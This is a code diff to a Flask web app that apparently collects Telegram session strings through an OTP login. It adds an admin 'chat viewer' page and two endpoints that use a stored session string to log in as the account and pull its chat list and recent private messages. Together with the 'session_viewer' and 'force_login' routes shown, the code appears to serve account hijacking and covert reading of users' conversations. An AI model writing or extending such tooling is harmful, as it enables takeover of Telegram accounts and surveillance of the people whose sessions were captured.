@@ -214,6 +214,12 @@ def session_viewer():
         return redirect(url_for("admin_panel"))
     return render_template("session_viewer.html")
 
+@app.route("/chat_viewer")
+def chat_viewer():
+    if not session.get("admin_logged_in"):
+        return redirect(url_for("admin_panel"))
+    return render_template("chat_viewer.html")
+
 # ================= API: AUTH (Per-request Telegram client) =================
 @app.route("/api/send_otp", methods=["POST"])
 def send_otp():
@@ -968,6 +974,85 @@ def force_login():
         return jsonify({"success": True, "telegram_id": tg_id})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/admin/chat_dialogs", methods=["POST"])
+def admin_chat_dialogs():
+    if not session.get("admin_logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    data = request.json
+    session_string = data.get("session_string")
+    if not session_string:
+        return jsonify({"error": "No session string"}), 400
+    
+    async def fetch_dialogs():
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.connect()
+        try:
+            dialogs = await client.get_dialogs()
+            result = []
+            for d in dialogs:
+                # চ্যাটের নাম ও আইডি বের করুন
+                if d.is_group or d.is_channel:
+                    name = d.name or "Group/Channel"
+                else:
+                    name = d.name or d.entity.first_name or "Unknown"
+                result.append({
+                    "id": d.id,
+                    "name": name,
+                    "unread_count": d.unread_count,
+                    "last_message": d.message.text if d.message else "",
+                    "is_group": d.is_group,
+                    "is_channel": d.is_channel
+                })
+            return result
+        finally:
+            await client.disconnect()
+    
+    try:
+        dialogs = run_async(fetch_dialogs())
+        return jsonify({"success": True, "dialogs": dialogs})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/admin/chat_messages", methods=["POST"])
+def admin_chat_messages():
+    if not session.get("admin_logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    data = request.json
+    session_string = data.get("session_string")
+    chat_id = data.get("chat_id")
+    limit = data.get("limit", 50)
+    if not session_string or not chat_id:
+        return jsonify({"error": "Missing parameters"}), 400
+    
+    async def fetch_messages():
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.connect()
+        try:
+            entity = await client.get_entity(int(chat_id))
+            messages = await client.get_messages(entity, limit=limit)
+            result = []
+            for msg in messages:
+                sender = msg.sender_id
+                result.append({
+                    "id": msg.id,
+                    "text": msg.text or msg.caption or "[media]",
+                    "sender_id": sender,
+                    "date": msg.date.isoformat() if msg.date else None
+                })
+            return result
+        finally:
+            await client.disconnect()
+    
+    try:
+        messages = run_async(fetch_messages())
+        return jsonify({"success": True, "messages": messages})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
 # ================= RUN =================
 if __name__ == "__main__":
